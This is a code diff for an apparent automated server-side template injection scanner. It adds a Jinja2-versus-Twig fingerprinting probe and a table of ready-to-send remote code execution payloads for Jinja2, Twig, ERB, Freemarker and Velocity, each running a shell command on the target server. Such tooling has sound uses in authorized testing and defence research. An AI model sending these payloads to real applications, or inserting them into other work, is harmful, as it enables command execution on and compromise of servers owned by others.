@@ -188,6 +188,59 @@ class AutoSSTI:
 
         return {"tested": len(results), "results": results}
 
+    def disambiguate_jinja2_twig(self) -> str:
+        """Distinguish Jinja2 from Twig using {{7*'7'}} trick.
+
+        Returns: 'jinja2' (7777777) or 'twig' (49) or 'unknown'
+        """
+        result = self._send("{{7*'7'}}")
+        body = result.get("body", "")
+
+        if "7777777" in body:
+            self.engine = "jinja2"
+            return "jinja2"
+        elif "49" in body:
+            self.engine = "twig"
+            return "twig"
+
+        return "unknown"
+
+    def get_rce_payload(self, engine: str = "") -> dict:
+        """Get RCE payload for identified template engine.
+
+        Args:
+            engine: Template engine name (auto-detected if empty)
+        """
+        engine = engine or self.engine
+
+        rce_payloads = {
+            "jinja2": {
+                "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                "description": "Jinja2 RCE via config object MRO chain",
+            },
+            "twig": {
+                "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                "description": "Twig RCE via undefined filter callback",
+            },
+            "erb": {
+                "payload": "<%=`id`%>",
+                "description": "ERB RCE via backtick execution",
+            },
+            "freemarker": {
+                "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+                "description": "Freemarker RCE via Execute utility",
+            },
+            "velocity": {
+                "payload": "#set($str=$class.inspect('java.lang.String'))#set($chr=$class.inspect('java.lang.Character'))#set($ex=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))",
+                "description": "Velocity RCE via Runtime.exec",
+            },
+        }
+
+        if engine in rce_payloads:
+            return rce_payloads[engine]
+
+        return {"error": f"Unknown engine: {engine}", "available": list(rce_payloads.keys())}
+
     def run_full_scan(self) -> dict:
         """Run complete automated SSTI scan."""
         start = time.time()
